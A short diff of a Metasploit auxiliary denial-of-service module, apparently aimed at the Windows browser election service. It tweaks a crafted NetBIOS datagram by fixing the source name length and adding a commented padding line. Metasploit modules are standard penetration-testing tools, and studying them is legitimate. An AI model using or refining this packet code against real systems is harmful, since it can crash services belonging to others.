@@ -11,7 +11,7 @@
 
 class Metasploit3 < Msf::Auxiliary
 
-   include Msf::Exploit::Remote::Udp
+	include Msf::Exploit::Remote::Udp
 	#include Msf::Exploit::Remote::SMB
 	include Auxiliary::Dos
 
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 		ip_src = Rex::Socket.gethostbyname(ip)[3]
 
 		svc_src = "\x41\x41\x00"   # pre-encoded?
-		name_src = Rex::Text.rand_text_alphanumeric(4+rand(10))
+		name_src = Rex::Text.rand_text_alphanumeric(15) # 4+rand(10))
 
 		svc_dst = "\x42\x4f\x00"   # pre-encoded?
 		name_dst = datastore['DOMAIN']
@@ -83,6 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 			"\x20" +              # Election OS (NT Server)
 			"\x1b\xe9\xa5\x00" +  # Uptime
 			"\x00\x00\x00\x00" +  # NULL... Padding?
+			#("A" * 4) + "\x00"
 			Rex::Text.rand_text_alphanumeric(410) + "\x00"
 
 		nbdghdr =
